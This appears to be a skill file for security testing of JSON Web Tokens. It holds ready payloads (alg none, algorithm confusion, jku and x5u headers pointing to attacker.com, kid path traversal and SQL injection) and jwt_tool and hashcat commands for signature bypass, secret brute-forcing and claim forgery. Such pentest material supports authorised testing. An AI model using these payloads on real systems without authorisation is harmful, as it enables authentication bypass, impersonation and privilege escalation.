---
name: jwt
description: JWT token structure analysis and attack techniques
applicable_contexts: [api, web, mobile]
---

## JWT Security Testing

### Token Structure Analysis

Decode (base64) the three parts: Header.Payload.Signature

```bash
# Quick decode
echo "HEADER_B64" | base64 -d
echo "PAYLOAD_B64" | base64 -d

# jwt_tool inspection
jwt_tool TOKEN
```

### Header Manipulation Attacks

| Attack | Modified Header |
|--------|----------------|
| None algorithm | `{"alg": "none"}` |
| Algorithm confusion | `{"alg": "HS256"}` (was RS256) |
| JKU injection | `{"alg": "RS256", "jku": "https://attacker.com/jwks.json"}` |
| JWK embedding | `{"alg": "RS256", "jwk": {"kty": "RSA", ...}}` |
| Kid traversal | `{"alg": "HS256", "kid": "../../dev/null"}` |
| Kid SQLi | `{"alg": "HS256", "kid": "key' UNION SELECT 'secret' --"}` |
| x5u injection | `{"alg": "RS256", "x5u": "https://attacker.com/cert.pem"}` |

### Signature Bypass

```bash
# None algorithm (remove signature)
jwt_tool TOKEN -X a

# Algorithm confusion (RS256 → HS256 with public key)
jwt_tool TOKEN -X k -pk public.pem

# Weak secret brute-force
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 TOKEN wordlist.txt
```

### Claim Manipulation

After bypassing signature:
- `sub` → change user identity
- `role` / `admin` → escalate privileges
- `exp` → extend expiration
- `iss` → change issuer
- `aud` → change audience

### Token Lifecycle Attacks

- Use expired token → check if still accepted
- Use pre-activation token (nbf in future)
- Cross-environment: use staging token in production
- Token replay after logout → verify invalidation

### Comprehensive JWT Scan

```bash
jwt_tool TOKEN -t "https://TARGET/api/protected" \
  -rh "Authorization: Bearer TOKEN" -M at
```

### Validation Requirements

- Demonstrate access to protected resource with forged/manipulated token
- Document exact modification and resulting access
- Show before/after comparison (original vs. manipulated token)
- Test with multiple protected endpoints

### Business Impact

- Complete authentication bypass
- Any-user impersonation
- Privilege escalation (user to admin)
- Persistent unauthorized access (extended expiration)
